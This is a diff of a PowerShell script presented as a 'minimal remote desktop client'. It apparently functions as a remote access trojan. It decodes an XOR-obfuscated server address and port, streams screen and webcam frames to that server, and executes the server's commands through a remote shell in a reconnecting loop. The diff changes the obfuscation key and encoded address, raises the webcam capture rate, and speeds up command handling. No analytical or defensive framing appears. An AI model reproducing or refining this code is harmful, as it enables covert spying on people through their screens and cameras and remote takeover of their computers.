@@ -1,9 +1,9 @@
 # Minimal Remote Desktop Client - Server-Controlled (v3 - Fast)
 # Encrypted connection config
-$_k=[Convert]::FromBase64String('P7p6IJ0QTHlRsj8wLCS2XA==')
+$_k=[Convert]::FromBase64String('OtlbQxSO4/2xAyvd2SQNYg==')
 function _D($e){$b=[Convert]::FromBase64String($e);$r=New-Object byte[] $b.Length;for($i=0;$i-lt $b.Length;$i++){$r[$i]=$b[$i]-bxor $_k[$i%$_k.Length]};[Text.Encoding]::UTF8.GetString($r)}
-$ServerIP=_D 'Do5ODqwnfldpihECGRQ='
-$ServerPort=[int](_D 'CYpKEA==')
+$ServerIP=_D 'C+1vbSW50dOJOwXv7BQ='
+$ServerPort=[int](_D 'DOlrcw==')
 
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.Windows.Forms
@@ -37,12 +37,12 @@ $script:jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where
 
 $g = @{tc=$null;s=$null;run=$true;str=$false;cam=$false;wc=$null;q=60;mon=0;sh=$null;sho=$null}
 
-function Send($d){try{$b=[Text.Encoding]::UTF8.GetBytes(($d|ConvertTo-Json -Compress -Depth 3)+"`n");$g.s.Write($b,0,$b.Length);$g.s.Flush();return $true}catch{return $false}}
+function Send($d){try{$b=[Text.Encoding]::UTF8.GetBytes(($d|ConvertTo-Json -Compress -Depth 3)+"`n");$g.s.Write($b,0,$b.Length);return $true}catch{return $false}}
 
 function SendBin($type,$data){
     if(!(Send @{type=$type})){return $false}
     $l=[BitConverter]::GetBytes([uint32]$data.Length);[Array]::Reverse($l)
-    $g.s.Write($l,0,4);$g.s.Write($data,0,$data.Length);$g.s.Flush();return $true
+    $g.s.Write($l,0,4);$g.s.Write($data,0,$data.Length);return $true
 }
 
 function ReadAll($stream,$buf,$count){
@@ -144,8 +144,8 @@ while($g.run){
         if(Scr){$ls=$n}else{Sleep -m 50}
     }
 
-    # Camera: 250ms interval = ~4 FPS
-    if($g.cam-and($n-$lc).TotalMilliseconds-ge 250){
+    # Camera: 100ms interval = ~10 FPS
+    if($g.cam-and($n-$lc).TotalMilliseconds-ge 100){
         try{$f=$g.wc.Get();if($f){SendBin "CAMERA_FRAME" $f|Out-Null};$lc=$n}catch{$g.cam=$false}
     }
 
@@ -155,20 +155,22 @@ while($g.run){
     # Heartbeat every 5s
     if(($n-$lh).TotalMilliseconds-ge 5000){if(!(Send @{type="HEARTBEAT";timestamp=$n.ToString("o")})){break}$lh=$n}
 
-    # Process incoming commands (non-blocking)
+    # Process incoming commands (non-blocking, bulk read)
     if($g.s.DataAvailable){
-        $buf=New-Object Collections.Generic.List[byte]
+        $rb=New-Object byte[] 65536
         while($g.s.DataAvailable){
-            $x=$g.s.ReadByte()
-            if($x-eq-1){break}
-            if($x-eq 10){
-                if($buf.Count-gt 0){$l=[Text.Encoding]::UTF8.GetString($buf.ToArray());Proc $l;$buf.Clear()}
-            }else{$buf.Add($x)}
+            $nr=$g.s.Read($rb,0,$rb.Length)
+            if($nr-le 0){break}
+            $chunk=[Text.Encoding]::UTF8.GetString($rb,0,$nr)
+            $lines=$chunk.Split([char]10)
+            for($li=0;$li-lt$lines.Length;$li++){
+                $ln=$lines[$li].Trim()
+                if($ln.Length-gt 0){Proc $ln}
+            }
         }
-        if($buf.Count-gt 0){$l=[Text.Encoding]::UTF8.GetString($buf.ToArray());Proc $l}
     }
 
-    # Minimal sleep to prevent CPU spin (15ms = responsive)
-    Sleep -m 15
+    # Minimal sleep - 1ms when active (streaming/shell), 10ms when idle
+    if($g.str-or$g.cam-or$g.sh){Sleep -m 1}else{Sleep -m 10}
 }
 }catch{}finally{StopShell;if($g.s){$g.s.Close()}if($g.tc){$g.tc.Close()}}Sleep 5}
